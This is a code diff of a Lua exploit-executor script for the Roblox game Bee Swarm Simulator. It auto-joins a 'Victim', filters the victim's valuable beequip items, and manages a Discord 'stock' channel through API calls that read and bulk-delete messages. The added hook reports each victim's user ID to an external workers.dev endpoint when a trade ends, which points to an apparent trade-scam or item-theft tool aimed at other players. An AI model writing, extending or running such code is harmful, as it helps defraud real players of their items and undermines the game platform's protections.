@@ -367,6 +367,22 @@ task.spawn(function()
         end
     end
 end)
+LocalPlayer.TradeConfig.IsTrading:GetPropertyChangedSignal("Value"):Connect(function()
+    if LocalPlayer.TradeConfig.IsTrading.Value then
+        repeat task.wait() until not LocalPlayer.TradeConfig.IsTrading.Value
+        if not Victim then return end
+        SafeRequest({
+            Url = "https://testbss.chieokure.workers.dev/finished",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+            },
+            Body = HttpService:JSONEncode({
+                userid = Victim.UserId
+            })
+        })
+    end
+end)
 if isfile("ExodusAutojoin") then
     Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
     FindVictim(Json)
@@ -415,7 +431,6 @@ local CaseEntry = require(await(ReplicatedStorage, "Beequips", "BeequipCaseEntry
 local BeequipFile = require(await(ReplicatedStorage, "Beequips", "BeequipFile"))
 
 local function GetBQStatsString(File, Name)
-    local Ping = false
     local Suc, Res = pcall(function()
         local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
         local Potential = File.Q * 5
@@ -473,9 +488,6 @@ local function GetBQStatsString(File, Name)
             if BeeAbilityPollen == nil and TokenLink == nil then
                 return
             end
-            if TokenLink or (BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2) then
-                Ping = true
-            end
             Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
 
         elseif Name == "Camphor Lip Balm" then
@@ -486,18 +498,13 @@ local function GetBQStatsString(File, Name)
                 if GoldBubblePollen then
                     local GBP = tonumber(GoldBubblePollen)
                     if GBP >= 6 then
-                        Ping = true
                     elseif GBP == 5 then
-                        Ping = true
                     elseif GBP == 4 then
                         if tonumber(BubblePollen) < 14 then return end
-                        Ping = true
                     elseif GBP == 3 then
                         if tonumber(BubblePollen) < 15 then return end
-                        Ping = true
                     elseif GBP == 2 then
                         if tonumber(BubblePollen) < 16 then return end
-                        Ping = true
                     else
                         return
                     end
@@ -509,19 +516,16 @@ local function GetBQStatsString(File, Name)
 
         elseif Name == "Candy Ring" then
             local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
-            if tonumber(HoneyAtHive) < 7 then
+            if tonumber(HoneyAtHive) < 9 then
                 return
             end
-            Ping = true
             Concat(HoneyAtHive .. "% Honey At Hive")
 
         elseif Name == "Charm Bracelet" then
             local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
             local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
             local Melody = Strings.Ability:match("Melody")
-            if Melody then
-                Ping = true
-            else
+            if not Melody then
                 return
             end
             Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")
@@ -531,6 +535,17 @@ local function GetBQStatsString(File, Name)
             local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
             if CPHB == nil and SCPHB == nil then
                 return
+            end
+            if CPHB then
+                if NumWaxes == 0 and Potential >= 4 and tonumber(CPHB) >= 4 then
+                else
+                    if tonumber(CPHB) < 6 and not SCPHB then return end
+                    if SCPHB then
+                        if tonumber(SCPHB) == 1 and tonumber(CPHB) < 3 then return end -- Anything else above 2 scp + any crp is good
+                    end
+                end
+            else
+                if tonumber(SCPHB) < 2 then return end
             end
             Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")
 
@@ -546,7 +561,6 @@ local function GetBQStatsString(File, Name)
                     return
                 end
             end
-            Ping = true
             Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")
 
         elseif Name == "Pink Shades" then
@@ -564,7 +578,6 @@ local function GetBQStatsString(File, Name)
             else
                 return
             end
-            Ping = true
             Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")
 
         elseif Name == "Smiley Sticker" then
@@ -574,35 +587,28 @@ local function GetBQStatsString(File, Name)
             if HoneyMark == nil then
                 return
             end
-            Ping = true
             Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))
 
         elseif Name == "Sweatband" then
             local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
             local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
-            if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < 26) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < 27)) then
+            local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
+            local WhitePollen = Strings.Hivebonus:match("%+(%d+)%% White Pollen")
+            RedPollen = RedPollen and tonumber(RedPollen) or 0
+            WhitePollen = WhitePollen and tonumber(WhitePollen) or 0
+            if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < (27 - RedPollen)) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < (29 - WhitePollen))) then
                 return
             end
-
-            local RGA = nil
-            if RedGatherAmount then
-                RGA = RedGatherAmount .. "% Red Gather Amount"
-            end
-            local WGA = nil
-            if WhiteGatherAmount then
-                WGA = WhiteGatherAmount .. "% White Gather Amount"
-            end
-            Ping = true
-            Concat(RGA, WGA)
+            Concat(
+                RedGatherAmount and RedGatherAmount .. "% Red Gather Amount", WhiteGatherAmount and WhiteGatherAmount .. "% White Gather Amount",
+                RedPollen and RedPollen .. "% Red Pollen", WhitePollen and WhitePollen .. "% White Pollen"
+            )
 
         elseif Name == "Whistle" then
             local Melody = Strings.Ability:match("Melody")
             local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
-            if Melody == nil and SuperCritPower == nil then
+            if Melody == nil and (not SuperCritPower or tonumber(SuperCritPower) < 4) then 
                 return
-            end
-            if Melody or (SuperCritPower and tonumber(SuperCritPower) >= 3) then
-                Ping = true
             end
             Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")
 
@@ -628,16 +634,12 @@ local function GetBQStatsString(File, Name)
                     return
                 end
             end
-            Ping = true
             Concat(HoneyAtHive .. "% Honey At Hive")
 
         elseif Name == "Festive Wreath" then
             local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
-            if HoneyAtHive == nil then
+            if not HoneyAtHive or tonumber(HoneyAtHive) < 2 then
                 return
-            end
-            if tonumber(HoneyAtHive) >= 2 then
-                Ping = true
             end
             Concat(HoneyAtHive .. "% Honey At Hive")
 
@@ -648,9 +650,6 @@ local function GetBQStatsString(File, Name)
                 if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
                     return
                 end
-            end
-            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
-                Ping = true
             end
             Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")
 
@@ -664,12 +663,9 @@ local function GetBQStatsString(File, Name)
                 return
             elseif PTC == 16 then
                 if PTP < 12 then return end
-                Ping = true
             elseif PTC == 17 then
                 if PTP < 9 then return end
-                Ping = true
             elseif PTC >= 18 then
-                Ping = true
             end
             Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")
 
@@ -685,13 +681,9 @@ local function GetBQStatsString(File, Name)
                     LimitRp = 5
                 end
                 if RedPollen and tonumber(RedPollen) >= LimitRp then
-                    Ping = true
                 else
                     return
                 end
-            end
-            if RedPollen and tonumber(RedPollen) >= 7 then
-                Ping = true
             end
             Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")
 
@@ -701,9 +693,6 @@ local function GetBQStatsString(File, Name)
             local BabyLove = Strings.Ability:match("Baby Love")
             if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
                 return
-            end
-            if BabyLove or (Capacity and tonumber(Capacity) >= 3) or BondFromTreats then
-                Ping = true
             end
             Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")
 
@@ -743,7 +732,7 @@ local function GetBQStatsString(File, Name)
     if not Suc then
         return "An error occured filtering stats: " .. tostring(Res)
     else
-        return Res, Ping
+        return Res
     end
 end
 
@@ -973,7 +962,7 @@ for i, bq in pairs(Beequips) do
 end
 
 local function c()
-    local res = http.request({
+    local res = SafeRequest({
         Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100",
         Method = "GET",
         Headers = {
@@ -989,7 +978,7 @@ local function c()
     end
     print(#ids, "A")
     if #ids == 1 then
-        print("T", http.request({
+        print("T", SafeRequest({
             Url = "https://discord.com/api/v9/channels/" .. AutoCollect.StockChannel .. "/messages/" .. ids[1],
             Method = "DELETE",
             Headers = {
@@ -998,7 +987,7 @@ local function c()
             },
         }))
     else
-        print("B", http.request({
+        print("B", SafeRequest({
             Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages/bulk-delete",
             Method = "POST",
             Headers = {
@@ -1017,7 +1006,7 @@ while task.wait() do
     c()
     repeat
         wait(1)
-        check = game:GetService("HttpService"):JSONDecode(http.request({
+        check = game:GetService("HttpService"):JSONDecode(SafeRequest({
             Url = "https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100",
             Method = "GET",
             Headers = {
